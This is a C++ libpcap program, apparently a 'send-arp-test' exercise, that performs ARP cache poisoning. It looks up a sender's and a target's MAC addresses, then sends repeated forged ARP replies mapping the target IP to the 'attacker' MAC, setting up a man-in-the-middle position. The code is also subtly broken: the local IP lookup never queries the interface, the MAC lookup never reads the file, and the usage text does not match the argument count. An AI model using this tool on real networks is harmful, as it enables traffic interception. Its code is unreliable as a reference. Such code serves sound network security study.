#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <net/if.h>
#include <arpa/inet.h>


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

char *ip_my(const char *dev);
char *mac_my(const char *dev);
void send_arp(pcap_t *handle, const char *dmac, const char *smac, const char *sip, const char *tip, const char *tmac, int mode);
void arp_change(pcap_t *handle, const char *senmac, const char *senip, const char *tarip, const char *attmac);
char *mac_arp(pcap_t *handle, const char *attmac, const char *attip, const char *tarip, int mode);
char *send_mac(uint8_t *mac);
char *target_mac(uint8_t *mac);

char myip[16];
unsigned char mymac[32];

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}


int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	char *const attacker_ip = ip_my(dev);
	char *const attacker_mac = mac_my(dev);

	char *const senmac = mac_arp(handle, attacker_mac, attacker_ip, argv[2], 1);
	char *const tarmac = mac_arp(handle, attacker_mac, attacker_ip, argv[3], 0);

	arp_change(handle, senmac, argv[2], argv[3], attacker_mac);
	
	printf("Attacker IP : %s\n", attacker_ip);
	printf("Attacker MAC : %s\n", attacker_mac);
	printf("Sender IP : %s\n", argv[2]);
	printf("Sender MAC : %s\n", senmac);
	printf("Target IP : %s\n", argv[3]);
	printf("Target MAC : %s\n", tarmac);
	
	pcap_close(handle);

}

char *ip_my(const char *dev)
{
	int i;
	struct ifreq ifr;
	static __thread char ip[16] = {0};

	i = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ);

	inet_ntop(AF_INET, ifr.ifr_addr.sa_data + sizeof(u_short), ip, sizeof(struct sockaddr));

	close(i);
 	return ip;
}

char *mac_my(const char *dev)
{
	static __thread char buf[18] = {0};

	int len = strlen(dev);
	int size = len + 24;
	char *path = (char *)malloc(size);
	snprintf(path, size, "%s%s%s", "/sys/class/net/", dev, "/address");

 	free(path);
 	return buf;
}


void send_arp(pcap_t *handle, const char *dmac, const char *smac, const char *sip, const char *tip, const char *tmac, int mode)
{
	EthArpPacket packet;
	
	packet.eth_.dmac_ = Mac(dmac);
	packet.eth_.smac_ = Mac(smac);
	packet.eth_.type_ = htons(EthHdr::Arp);
	
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	if (mode == 0)
        	packet.arp_.op_ = htons(ArpHdr::Request);
	else if (mode == 1)
		packet.arp_.op_ = htons(ArpHdr::Reply);

	packet.arp_.smac_ = Mac(smac);
	packet.arp_.sip_ = htonl(Ip(sip));
	packet.arp_.tmac_ = Mac(tmac);
	packet.arp_.tip_ = htonl(Ip(tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
	if (res != 0)
    	{
        	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        	exit(-1);
    	}
}

void arp_change(pcap_t *handle, const char *senmac, const char *senip, const char *tarip, const char *attmac)
{
	for (int i = 0; i < 5; i++)
		send_arp(handle, senmac, attmac, tarip, senip, senmac, 1);
}

char *mac_arp(pcap_t *handle, const char *attmac, const char *attip, const char *tarip, int mode)
{
	struct pcap_pkthdr *header;
	struct ArpHdr arp;
	struct Ip aip(attip);
        struct Mac amac(attmac);
        struct Ip tip(tarip);
	const u_char *packet;

	send_arp(handle, "ff:ff:ff:ff:ff:ff", attmac, attip, tarip, "00:00:00:00:00:00", 0); //send arp req to target

	while (true)
	{
	        int res = pcap_next_ex(handle, &header, &packet);

        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        if (packet != NULL)
        {
            memcpy(&arp, packet + 14, sizeof(arp));
            if (aip == arp.tip() && amac == arp.tmac() && tip == arp.sip())
                break;
        }
    }

	Mac src_mac = arp.smac();
	uint8_t *smac = reinterpret_cast<uint8_t *>(&src_mac);

	if (mode == 0)
	        return target_mac(smac);
	else
	        return send_mac(smac);
}


char *send_mac(uint8_t *mac)
{
	static __thread char buf[18] = {0};
	snprintf(buf, sizeof(buf),"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	return buf;
}

char *target_mac(uint8_t *mac)
{
	static __thread char buf[18] = {0};
	snprintf(buf, sizeof(buf),"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	return buf;
}
